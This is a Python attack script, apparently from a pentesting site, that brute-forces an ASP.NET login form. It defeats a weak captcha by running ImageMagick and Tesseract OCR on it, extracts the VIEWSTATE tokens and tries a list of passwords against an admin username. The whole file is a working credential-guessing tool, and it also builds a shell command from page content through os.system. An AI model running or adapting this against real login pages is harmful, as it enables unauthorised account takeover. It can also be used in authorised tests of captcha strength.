# Name        : captcha-bypass.py
# Description : This script can be used to bruteforce a form using a weak captcha.
#               Tesseract OCR is used to transform the captcha image to text.
#               Example with ASP.NET, extracting the viewstate value.
# Author      : Lisandre.com
# Date        : 2025-04-29
# Prereq      : sudo apt install tesseract-ocr
#               (ImageMagick "convert" already installed in Kali Linux)
import requests
import os
import subprocess
import re
import urllib.parse

### CHANGE THIS ###
url = "http://<your-url>/login.aspx"
success_message = "Welcome" # Message from the app when the login was successful
username = "admin%40example.com"

headers = {
  'Content-Type': 'application/x-www-form-urlencoded'
}

proxies = None
# Intercept requests using Burp :)
#proxies = {
#  'http': 'http://127.0.0.1:8080',
#  'https': 'http://127.0.0.1:8080'
#}

def extract_image(html):
    # Any processing to extract the captcha image from the website
    match = re.search(r'data:image/\w+;base64,([A-Za-z0-9+/=]+)', html)
    if match:
        return match.group(1)
    else:
        return ""

def extract_viewstate(html):
    # Any processing to extract the captcha image from the website
    match = re.search(r'"__VIEWSTATE" value="/([A-Za-z0-9+/=]+)', html)
    if match:
        return match.group(1)
    else:
        return ""

def extract_viewstategenerator(html):
    # Any processing to extract the captcha image from the website
    match = re.search(r'id="__VIEWSTATEGENERATOR" value="([A-Za-z0-9+/=]+)', html)
    if match:
        return urllib.parse.quote(match.group(1))
    else:
        return ""

def solve_captcha(b64img):
    os.system('echo "' + b64img + '" | base64 -d > captcha.png')

    # Make adjustments with ImageMagick if needed (invert, adjust brightness, etc.)
    # threshold: any pixel brighter than x% white becomes white, else becomes black
    os.system('convert captcha.png -background white -alpha remove -alpha off -colorspace gray -threshold 95% captcha.png')

    # Run tesseract and capture output
    result = subprocess.run(
        ["tesseract", "captcha.png", "stdout"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True  # Returns output as string instead of bytes
    )

    return result.stdout.strip()

# Main
session = requests.Session()

# This is a password list example, this could be updated to read from a file
for password in ["password1", "password2", "password3", "password4"]:
    response = session.get(url, headers=headers, proxies=proxies)
    image = extract_image(response.text)
    captcha = solve_captcha(image)
    viewstate = extract_viewstate(response.text)
    viewstategenerator = extract_viewstategenerator(response.text)

    ### CHANGE THE PAYLOAD BASED ON THE APP ###
    payload="__VIEWSTATE=%2F" + viewstate + "&__VIEWSTATEGENERATOR=" + viewstategenerator + "&Username=" + username + "&Password=" + password + "&Captcha=" + captcha + "&Button=Login"
    response = session.post(url, headers=headers, data=payload, proxies=proxies)

    if success_message in response.text:
        print(username + "/" + password + " (captcha " + captcha + ") : LOGIN SUCCESSFUL")
        session.close()
        exit(0)
    else:
        print(username + "/" + password + " (captcha " + captcha + ") : LOGIN FAILED")

session.close()
